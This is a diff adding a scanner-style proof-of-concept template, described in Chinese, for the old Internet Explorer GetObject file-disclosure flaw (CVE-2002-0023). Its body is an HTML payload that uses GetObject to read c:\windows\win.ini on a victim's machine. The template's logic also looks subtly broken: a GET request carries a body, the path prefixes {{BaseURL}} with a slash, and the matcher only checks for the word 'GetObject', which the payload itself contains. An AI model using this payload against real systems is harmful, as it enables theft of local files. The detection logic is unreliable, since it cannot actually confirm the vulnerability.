@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "通过构造恶意 HTML 页面，利用 Internet Explorer 5/6 的 GetObject 函数绕过安全检查，读取目标系统任意文件。攻击者诱导用户访问包含特制 GetObject 调用的网页即可触发。"
+id = "POC-AVE-2002-0145"
+name = "Microsoft Internet Explorer GetObject 文件泄露漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2002-0023",
+    "ie-getobject",
+    "file-disclosure",
+]
+vuln_id = [
+    "CVE-2002-0023",
+    "AVE-2002-0145",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = '''<html><script>var x = GetObject('c:\windows\win.ini');alert(x);</script></html>'''
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["GetObject"]
